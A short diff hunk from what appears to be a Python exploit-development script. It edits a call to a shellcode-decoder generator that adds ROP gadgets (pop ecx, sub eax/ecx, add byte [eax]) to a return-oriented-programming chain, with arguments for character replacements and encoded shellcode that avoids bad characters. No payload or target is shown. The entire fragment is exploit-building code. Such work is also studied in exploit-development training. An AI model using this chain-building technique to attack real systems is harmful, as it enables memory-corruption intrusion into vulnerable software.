@@ -450,12 +450,11 @@ def main():
 
         # Generate the shellcode decoder and add it to the rop chain
         rop += generateShellcodeDecoder(
+            replacements=replacements,
             rop_pop_ecx=rop_pop_ecx_ret,
             rop_sub_eax_ecx_pop_ebx=rop_sub_eax_ecx_pop_ebx_ret,
             rop_add_ptrEAX_1_bh=rop_add_ptrEAX_1_bh_ret,
-            replacements=replacements,
-            encodedShellcode=encoded_shellcode,
-            badChars=bad_chars,
+            debug=True
         )  
 
         """
